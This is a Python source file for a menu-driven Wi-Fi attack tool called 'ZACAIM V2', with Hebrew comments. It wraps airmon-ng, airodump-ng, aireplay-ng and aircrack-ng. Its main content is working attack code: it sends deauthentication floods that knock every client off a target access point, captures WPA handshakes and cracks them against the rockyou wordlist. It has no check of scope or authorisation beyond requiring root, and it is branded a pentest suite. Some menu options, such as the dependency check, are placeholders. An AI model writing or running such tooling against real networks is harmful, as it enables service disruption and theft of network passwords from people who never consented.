#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import csv
import json
import time
import signal
import shutil
import logging
import tempfile
import subprocess
from pathlib import Path
from dataclasses import dataclass, asdict, field
from datetime import datetime
from typing import List, Optional, Dict, Any

# הגדרות מערכת
APP_NAME = "ZACAIM V2 - CYBER LAB AUDIT"
APP_DIR = Path.home() / ".zacaim_v2"
SESSIONS_DIR = APP_DIR / "sessions"
LOGS_DIR = APP_DIR / "logs"
CONFIG_FILE = APP_DIR / "config.json"

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

@dataclass
class WirelessNetwork:
    bssid: str
    essid: str
    channel: str
    privacy: str
    cipher: str
    auth: str
    power: str
    beacons: str

@dataclass
class Session:
    session_id: str
    started_at: str
    selected_interface: Optional[str] = None
    monitor_interface: Optional[str] = None
    networks: List[WirelessNetwork] = field(default_factory=list)

# --- לוגיקת תקיפה ---

class AttackManager:
    def __init__(self, logger: logging.Logger):
        self.logger = logger

    def deauth(self, iface: str, bssid: str, client: str = "FF:FF:FF:FF:FF:FF", count: int = 15):
        """ניתוק משתמשים מהרשת"""
        print(f"{Colors.RED}[!] Sending {count} Deauth packets to {bssid}...{Colors.RESET}")
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "-c", client, iface]
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Colors.GREEN}[+] Deauth completed.{Colors.RESET}")

    def capture_handshake(self, iface: str, bssid: str, channel: str, session_path: Path):
        """האזנה ללכידת Handshake"""
        hs_dir = session_path / "handshakes"
        hs_dir.mkdir(parents=True, exist_ok=True)
        output = hs_dir / f"cap_{bssid.replace(':', '')}"
        
        print(f"{Colors.CYAN}[*] Starting Capture on CH {channel}. Press Ctrl+C when Handshake is captured...{Colors.RESET}")
        cmd = ["airodump-ng", "--bssid", bssid, "--channel", channel, "--write", str(output), iface]
        
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Capture stopped. Files saved in {hs_dir}{Colors.RESET}")

    def crack_handshake(self, cap_file: str, wordlist: str):
        """פיצוח סיסמה בעזרת אירקראק"""
        if not os.path.exists(wordlist):
            print(f"{Colors.RED}[!] Wordlist not found!{Colors.RESET}")
            return
        
        print(f"{Colors.MAGENTA}[*] Launching Aircrack-ng...{Colors.RESET}")
        cmd = ["aircrack-ng", "-w", wordlist, cap_file]
        subprocess.run(cmd)

# --- ממשק משתמש וניהול ---

class ConsoleUI:
    @staticmethod
    def banner():
        os.system("clear")
        print(f"""{Colors.RED}{Colors.BOLD}
    ███████╗ █████╗  ██████╗ █████╗ ██╗███╗   ███╗    ██╗   ██╗██████╗ 
    ╚══███╔╝██╔══██╗██╔════╝██╔══██╗██║████╗ ████║    ██║   ██║╚════██╗
      ███╔╝ ███████║██║     ███████║██║██╔████╔██║    ██║   ██║ █████╔╝
     ███╔╝  ██╔══██║██║     ██╔══██║██║██║╚██╔╝██║    ╚██╗ ██╔╝██╔═══╝ 
    ███████╗██║  ██║╚██████╗██║  ██║██║██║ ╚═╝ ██║     ╚████╔╝ ███████╗
    ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝      ╚═══╝  ╚══════╝
        {Colors.CYAN}>> THE ULTIMATE WIFI PENTEST SUITE | BY ROTEM ZACAIM <<{Colors.RESET}
        """)

    @staticmethod
    def main_menu(iface, mon):
        print(f"{Colors.BLUE}IFACE: {iface if iface else 'NONE'} | MONITOR: {mon if mon else 'OFF'}{Colors.RESET}")
        print("-" * 65)
        print(f"1. {Colors.GREEN}Health Check{Colors.RESET} (Verify Tools)")
        print(f"2. {Colors.GREEN}Select Interface{Colors.RESET}")
        print(f"3. {Colors.GREEN}Toggle Monitor Mode{Colors.RESET}")
        print(f"4. {Colors.YELLOW}Passive Scan{Colors.RESET}")
        print(f"5. {Colors.RED}Deauth Attack{Colors.RESET} (Disconnect)")
        print(f"6. {Colors.RED}Capture Handshake{Colors.RESET}")
        print(f"7. {Colors.MAGENTA}Crack Password{Colors.RESET}")
        print(f"8. {Colors.RESET}Restore & Exit")
        return input(f"\n{Colors.RED}ZACAIM@KALI{Colors.RESET}:~# ")

# --- לוגיקה מרכזית (מעטפת למחלקה הקודמת שלך) ---

def main():
    # בדיקת הרשאות
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!] ZACAIM V2 requires ROOT privileges.{Colors.RESET}")
        return

    # אתחול
    APP_DIR.mkdir(parents=True, exist_ok=True)
    SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
    
    # שימוש במחלקות מהקוד המקורי שלך (בהנחה שהן קיימות בקובץ)
    # כאן אני מוסיף את הקישור ל-Manager החדש
    logger = logging.getLogger("ZACAIM")
    attacker = AttackManager(logger)
    
    # משתני מצב
    selected_iface = None
    mon_iface = None
    session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    current_session_path = SESSIONS_DIR / session_id
    current_session_path.mkdir(parents=True, exist_ok=True)

    while True:
        ConsoleUI.banner()
        choice = ConsoleUI.main_menu(selected_iface, mon_iface)

        if choice == "1":
            # כאן תריץ את ה-DependencyChecker.check() מהקוד שלך
            print("[+] Checking dependencies...")
            time.sleep(1)
        
        elif choice == "2":
            selected_iface = input("Enter Interface Name (e.g. wlan0): ")
        
        elif choice == "3":
            if not selected_iface: print("Select iface first!"); time.sleep(1); continue
            if not mon_iface:
                print(f"Enabling Monitor on {selected_iface}...")
                subprocess.run(["airmon-ng", "start", selected_iface], capture_output=True)
                mon_iface = selected_iface + "mon"
            else:
                subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True)
                mon_iface = None
        
        elif choice == "4":
            if not mon_iface: print("Monitor mode required!"); time.sleep(1); continue
            dur = input("Scan duration (sec) [15]: ") or "15"
            # כאן תריץ את ה-PassiveScanner שלך
            subprocess.run(["airodump-ng", mon_iface], timeout=int(dur))
            
        elif choice == "5":
            if not mon_iface: print("Monitor mode required!"); time.sleep(1); continue
            bssid = input("Target BSSID: ")
            client = input("Target Client (Enter for ALL): ") or "FF:FF:FF:FF:FF:FF"
            attacker.deauth(mon_iface, bssid, client)
            input("Press Enter to return...")

        elif choice == "6":
            if not mon_iface: print("Monitor mode required!"); time.sleep(1); continue
            bssid = input("Target BSSID: ")
            ch = input("Channel: ")
            attacker.capture_handshake(mon_iface, bssid, ch, current_session_path)

        elif choice == "7":
            cap_path = input("Path to .cap file: ")
            wlist = input("Path to wordlist [/usr/share/wordlists/rockyou.txt]: ") or "/usr/share/wordlists/rockyou.txt"
            attacker.crack_handshake(cap_path, wlist)
            input("Press Enter to return...")

        elif choice == "8":
            if mon_iface: subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True)
            print("Cleaning up... System Restored.")
            break

if __name__ == "__main__":
    main()
